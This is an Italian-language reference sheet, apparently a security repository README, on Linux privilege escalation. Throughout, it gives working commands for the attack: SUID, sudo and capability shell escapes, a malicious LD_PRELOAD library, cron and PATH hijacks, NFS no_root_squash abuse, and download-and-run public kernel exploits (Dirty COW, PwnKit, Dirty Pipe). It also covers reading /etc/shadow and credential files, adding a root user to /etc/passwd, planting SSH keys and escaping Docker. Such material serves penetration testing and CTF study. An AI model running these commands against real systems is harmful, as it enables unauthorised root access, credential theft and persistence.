# 🐧 Escalation dei privilegi su Linux — scheda di riferimento completa

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-PrivEsc-red?style=for-the-badge" alt="Linux PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/Root-Access-blue?style=for-the-badge" alt="Root">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Guida completa all’escalation dei privilegi sui sistemi Linux</b>
</p>

> **Nota sugli esempi originali:** le tecniche dipendono da permessi effettivi, shell, mount, pacchetti e patch; un bit SUID o una capability non garantisce da solo una shell root. La tabella “kernel” include anche problemi in spazio utente: PwnKit riguarda [polkit/pkexec](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) e Baron Samedit riguarda sudo. Gli intervalli indicati sono semplificazioni e non sostituiscono gli avvisi della distribuzione; gli esempi Nmap interattivi sono storici. Nel frammento `cp`, gli apici singoli mantengono letterale la sostituzione `$(...)` e il file temporaneo non viene inizializzato dalla copia di backup. `find -writable` verifica l’accesso dell’utente corrente, non equivale a “scrivibile da chiunque”; `-perm -222` richiede tutti i bit indicati. Gli indizi Docker e il montaggio di una partizione non provano da soli una fuga dal container. Comandi e dati originali restano invariati.

---

## 📋 Indice

- [Enumerazione](#-enumerazione)
- [SUID/SGID](#-suidsgid)
- [Capability (privilegi granulari)](#-capability-privilegi-granulari)
- [Sfruttamento di sudo](#-sfruttamento-di-sudo)
- [Attività cron](#-attività-cron)
- [Dirottamento di PATH (PATH hijacking)](#-dirottamento-di-path-path-hijacking)
- [Root squashing su NFS](#-root-squashing-su-nfs)
- [Sfruttamento delle vulnerabilità del kernel](#-sfruttamento-delle-vulnerabilità-del-kernel)
- [Ricerca di password (password mining)](#-ricerca-di-password-password-mining)
- [Chiavi SSH](#-chiavi-ssh)
- [File scrivibili](#-file-scrivibili)
- [Uscita dal container Docker (container escape)](#-uscita-dal-container-docker-container-escape)
- [Riferimento rapido](#-riferimento-rapido)

---

## 🔍 Enumerazione

### Informazioni sul sistema

```bash
# Nome host
hostname

# Sistema operativo e kernel
cat /etc/os-release
cat /etc/issue
uname -a
uname -r

# Architettura
arch
uname -m

# Informazioni sulla CPU
cat /proc/cpuinfo
lscpu
```

### Informazioni sugli utenti

```bash
# Utente corrente
whoami
id

# Tutti gli utenti
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"

# Gruppi degli utenti
groups
cat /etc/group

# Utenti connessi
w
who
users

# Accessi recenti
last
lastlog

# Privilegi sudo
sudo -l
```

### Informazioni di rete

```bash
# Indirizzi IP
ip a
ifconfig

# Rotte
ip route
route -n

# Porte aperte
netstat -tulpn
ss -tulpn

# Connessioni attive
netstat -an
ss -an

# Cache ARP
arp -a
ip neigh

# DNS
cat /etc/resolv.conf

# Host
cat /etc/hosts
```

### Processi e servizi

```bash
# Processi in esecuzione
ps aux
ps -ef
ps aux | grep root

# Servizi
systemctl list-units --type=service
service --status-all

# Pacchetti installati
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # RHEL/CentOS
```

### Attività pianificate

```bash
# Crontabs
crontab -l
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*

# Timer systemd
systemctl list-timers
```

---

## 🔐 SUID/SGID

### Individua i binari SUID

```bash
# Individua i file SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Individua i file SGID
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Individua entrambi
find / -perm /6000 -type f 2>/dev/null
```

### Binari SUID comuni potenzialmente sfruttabili

Consulta [GTFOBins](https://gtfobins.github.io/) per i metodi di sfruttamento!

#### **bash**
```bash
# Se bash ha il bit SUID
./bash -p
```

#### **find**
```bash
find . -exec /bin/sh -p \; -quit
```

#### **vim**
```bash
vim -c ':!/bin/sh'
```

#### **nmap** (versioni precedenti)
```bash
nmap --interactive
!sh
```

#### **python**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

#### **perl**
```bash
perl -e 'exec "/bin/sh";'
```

#### **less/more**
```bash
less /etc/passwd
!/bin/sh
```

#### **cp**
```bash
# Copia /etc/passwd, aggiungi un utente root e ricopia il file
LFILE=/etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd $LFILE
```

#### **env**
```bash
env /bin/sh -p
```

---

## ⚡ Capability (privilegi granulari)

### Individua le capability

```bash
# Ottieni le capability dei file
getcap -r / 2>/dev/null

# Capability potenzialmente pericolose comuni
# CAP_SETUID - modifica l'UID
# CAP_NET_RAW - socket raw
# CAP_DAC_READ_SEARCH - lettura di qualsiasi file
```

### Sfrutta le capability

#### **Python (cap_setuid)**
```bash
# Se python ha cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### **Perl (cap_setuid)**
```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

#### **tar (cap_dac_read_search)**
```bash
# Leggi qualsiasi file
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

#### **vim (cap_setuid)**
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

## 🔑 Sfruttamento di sudo

### Verifica i permessi sudo

```bash
sudo -l
# Cerca le voci NOPASSWD
# Cerca le voci (ALL) o (root)
```

### Sfrutta sudo

#### **sudo ALL**
```bash
sudo /bin/bash
sudo su
```

#### **LD_PRELOAD**
```bash
# Se sudo -l mostra env_keep+=LD_PRELOAD
# Crea una libreria malevola

cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_program
```

#### **sudo vim**
```bash
sudo vim -c ':!/bin/sh'
```

#### **sudo less/more**
```bash
sudo less /etc/passwd
!/bin/sh
```

#### **sudo find**
```bash
sudo find /tmp -exec /bin/sh \;
```

#### **sudo nmap** (modalità interattiva)
```bash
sudo nmap --interactive
!sh
```

#### **sudo tar**
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### **sudo zip**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

#### **sudo env**
```bash
sudo env /bin/sh
```

#### **sudo awk**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### **sudo man**
```bash
sudo man man
!/bin/sh
```

#### **sudo apache2**
```bash
sudo apache2 -f /etc/shadow
# Rivela la prima riga di shadow
```

### Vulnerabilità di specifiche versioni di sudo

```bash
# Verifica la versione
sudo --version

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
# sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

---

## ⏰ Attività cron

### Individua le attività cron

```bash
# Crontab di sistema
cat /etc/crontab

# Directory cron
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Crontab degli utenti
cat /var/spool/cron/crontabs/*

# Osserva l'esecuzione delle attività cron
# Usa pspy per monitorare i processi
```

### Sfrutta le attività cron

#### **Script cron scrivibile**
```bash
# Se cron esegue uno script su cui puoi scrivere:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# Attendi cron, poi:
/tmp/bash -p
```

#### **Injection tramite caratteri jolly (tar)**
```bash
# Se cron esegue: tar czf /tmp/backup.tar.gz *

# Crea file malevoli
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

#### **Sfruttamento di PATH**
```bash
# Se cron usa un percorso relativo e controlli PATH
# Il crontab mostra: PATH=/home/user:/usr/local/bin:...
# Lo script richiama: backup.sh (senza percorso completo)

# Crea uno script fittizio in una directory di PATH scrivibile
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/backup.sh
chmod +x /home/user/backup.sh
```

---

## 🛤 Dirottamento di PATH (PATH hijacking)

### Individua gli script vulnerabili

```bash
# Cerca script eseguiti da root che usano percorsi relativi
# Verifica gli script SUID
# Verifica gli script cron
# Verifica i servizi systemd
```

### Sfrutta PATH

```bash
# Se uno script di root richiama 'service' senza percorso completo
# e controlli PATH:

# Crea un 'service' malevolo
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Esegui lo script vulnerabile
./vulnerable_script
```

---

## 📁 Root squashing su NFS

### Individua le condivisioni NFS

```bash
# Sulla macchina dell'attaccante
showmount -e target_ip

# Verifica le esportazioni
cat /etc/exports
# Cerca no_root_squash
```

### Sfrutta no_root_squash

```bash
# Sulla macchina dell'attaccante (come root):
mkdir /tmp/nfs
mount -o rw target_ip:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# Sul sistema bersaglio:
/share/bash -p
```

---

## 💣 Sfruttamento delle vulnerabilità del kernel

### Verifica la versione del kernel

```bash
uname -r
uname -a
cat /proc/version
```

### Vulnerabilità del kernel comuni

| CVE | Versione del kernel | Nome |
|-----|----------------|------|
| CVE-2016-5195 | 2.x - 4.8.3 | **Dirty COW** |
| CVE-2021-4034 | All | **PwnKit** |
| CVE-2021-3156 | sudo < 1.9.5p2 | **Baron Samedit** |
| CVE-2022-0847 | 5.8 - 5.16.11 | **Dirty Pipe** |
| CVE-2022-2588 | 5.x | **DirtyCred** |

### Dirty COW (CVE-2016-5195)
```bash
# Scarica e compila
wget https://www.exploit-db.com/download/40839
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
```

### PwnKit (CVE-2021-4034)
```bash
# Scarica
git clone https://github.com/ly4k/PwnKit
cd PwnKit
chmod +x PwnKit
./PwnKit
```

### Dirty Pipe (CVE-2022-0847)
```bash
# Verifica prima la versione del kernel
uname -r

# Scarica e compila
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1
```

---

## 🔑 Ricerca di password (password mining)

### Cerca password

```bash
# Nei file
grep -r "password" /home/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# File di configurazione
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /etc/mysql/my.cnf

# File della cronologia
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# Ambiente
env
printenv
```

### File delle password

```bash
# File shadow (richiede root)
cat /etc/shadow

# Hash delle password da shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

### Percorsi comuni

```bash
# Configurazioni web
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/.htpasswd

# Configurazioni dei database
/etc/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# File di backup
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
```

---

## 🔐 Chiavi SSH

### Individua le chiavi SSH

```bash
# Chiavi private
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Chiavi autorizzate
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

### Sfrutta le chiavi SSH

```bash
# Se trovi una chiave privata leggibile:
chmod 600 id_rsa
ssh -i id_rsa user@localhost
ssh -i id_rsa root@localhost
```

### Aggiungi la tua chiave SSH

```bash
# Genera la chiave sulla macchina dell'attaccante
ssh-keygen -t rsa -b 4096

# Se puoi scrivere in authorized_keys:
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
echo "YOUR_PUBLIC_KEY" >> /home/user/.ssh/authorized_keys
```

---

## 📝 File scrivibili

### File critici scrivibili

```bash
# Verifica i permessi di scrittura
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```

### Sfrutta un /etc/passwd scrivibile

```bash
# Genera l'hash della password
openssl passwd -1 -salt hacker password
# Risultato: $1$hacker$TzyKlv0/R/c28R.GAeLw.1

# Aggiungi un utente root
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash' >> /etc/passwd

# Accesso
su hacker
# Password: password
```

### Individua i file scrivibili da chiunque

```bash
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# Directory scrivibili da chiunque
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

---

## 🐳 Uscita dal container Docker (container escape)

### Verifica se sei in Docker

```bash
# Verifica la presenza di .dockerenv
ls -la /.dockerenv

# Verifica i cgroup
cat /proc/1/cgroup | grep docker

# Verifica il nome host (stringa casuale)
hostname
```

### Socket Docker montato

```bash
# Se docker.sock è montato
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock

# Esci dal container tramite il socket Docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Container privilegiato

```bash
# Se il container è privilegiato
fdisk -l                    # Visualizza i dischi dell'host
mount /dev/sda1 /mnt
chroot /mnt
```

---

## 📊 Riferimento rapido

### Enumerazione con comandi su una riga

```bash
# Informazioni rapide sul sistema
id; hostname; uname -a; cat /etc/issue

# Controllo rapido SUID
find / -perm -4000 -type f 2>/dev/null

# Controllo rapido delle capability
getcap -r / 2>/dev/null

# Controllo rapido di sudo
sudo -l

# Controllo rapido di cron
cat /etc/crontab; ls -la /etc/cron*

# Ricerca rapida delle password
grep -r "password" /home/ 2>/dev/null
```

### Strumenti automatici

| Strumento | Descrizione |
|------|-------------|
| **LinPEAS** | Enumerazione approfondita |
| **LinEnum** | Enumerazione Linux |
| **linux-smart-enumeration** | LSE |
| **pspy** | Monitor dei processi |

### Checklist dei controlli iniziali

- [ ] `sudo -l` - Verifica i permessi sudo
- [ ] Binari SUID - Individuali e consulta GTFOBins
- [ ] Capability - `getcap -r / 2>/dev/null`
- [ ] Attività cron - Gli script sono scrivibili?
- [ ] Versione del kernel - Esistono vulnerabilità note?
- [ ] /etc/shadow leggibile
- [ ] /etc/passwd scrivibile
- [ ] Chiavi SSH in /home/* o /root
- [ ] Socket Docker montato
- [ ] NFS con no_root_squash

---

## 📚 Risorse

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

### Schede correlate
- [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [Escalation dei privilegi su Windows](../../Windows-PrivEsc/translations/README.it.md)

---

<p align="center">
  <b>🐧 Ottieni l’accesso root!</b><br>
  <i>Padroneggia l’escalation dei privilegi su Linux</i>
</p>
